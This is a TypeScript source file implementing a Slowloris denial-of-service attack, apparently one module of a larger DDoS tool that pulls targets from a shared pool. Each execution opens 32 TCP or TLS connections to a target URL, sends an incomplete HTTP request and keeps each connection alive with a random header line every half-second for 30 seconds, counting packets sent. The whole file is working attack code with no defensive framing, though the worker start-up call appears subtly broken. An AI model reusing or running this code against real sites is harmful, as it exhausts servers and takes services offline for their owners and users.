import net, { Socket } from 'net'
import tls, { TLSSocket } from 'tls'
import { URL } from 'url'

import { SlowLorisTarget } from '../external/targetsPool'
import { Algorithm, ExecutionResult } from './algorithm'

const SOCKETS_PER_ALGORITHM = 32
const SEND_TIME = 30000

class SlowSocket {
  protected url: URL
  protected working: boolean
  protected _packetsSend: number
  protected _successfullPackets: number

  get packetsSend () { return this._packetsSend }
  get successfullPackets () { return this._successfullPackets }

  constructor (url: URL) {
    this.url = url
    this.working = true
    this._packetsSend = 0
    this._successfullPackets = 0
    setImmediate(() => void this.worker.bind(this))
  }

  stop () {
    this.working = false
  }

  protected async worker () {
    while (this.working) {
      try {
        await this.atackRound()
      } catch (e) {}
    }
  }

  protected async atackRound () {
    const https = this.url.protocol === 'https:'
    const port = https ? 443 : 80

    const options = {
      port: port,
      host: this.url.host,
      timeout: 10000
    }

    this._packetsSend += 1
    const socket = await new Promise<Socket | TLSSocket>((resolve, reject) => {
      if (https) {
        const s = tls.connect(options, () => {
          resolve(s)
        })
        s.on('error', reject)
      } else {
        const s = net.connect(options, () => {
          resolve(s)
        })
        s.on('error', reject)
      }
      setTimeout(reject, 11000)
    })
    this._successfullPackets += 1

    socket.on('error', () => {
      socket.destroy()
    })

    socket.write('GET / HTTP/1.1\r\n')
    socket.write(`Host: ${this.url.host}\r\n`)
    socket.write('Accept: */*\r\n')
    socket.write(
      'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_11_6) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/53.0.2785.143 Safari/537.36\r\n'
    )

    socket.setTimeout(0)

    while (this.working) {
      try {
        this._packetsSend += 1
        socket.write(`KeepAlive: ${Math.random() * 1000}\r\n`)
        this._successfullPackets += 1
      } catch {
        break
      }
      await new Promise((resolve) => setTimeout(resolve, 500))
    }

    try {
      socket.destroy()
    } catch {}
  }
}

export class SlowLoris extends Algorithm {
  isValid (target: SlowLorisTarget): boolean {
    if (typeof target.page !== 'string' || !target.page.startsWith('http')) {
      return false
    }
    return true
  }

  async execute (target: SlowLorisTarget): Promise<ExecutionResult> {
    const slowSockets = []
    for (let i = 0; i < SOCKETS_PER_ALGORITHM; i += 1) {
      slowSockets.push(new SlowSocket(new URL(target.page)))
    }

    await new Promise((resolve) => setTimeout(resolve, SEND_TIME))

    let packetsSend = 0, packetsSuccess = 0
    for (let i = 0; i < SOCKETS_PER_ALGORITHM; i += 1) {
      slowSockets[i].stop()
      packetsSend += slowSockets[i].packetsSend
      packetsSuccess += slowSockets[i].successfullPackets
    }

    return { packetsSend, packetsSuccess, target }
  }
}
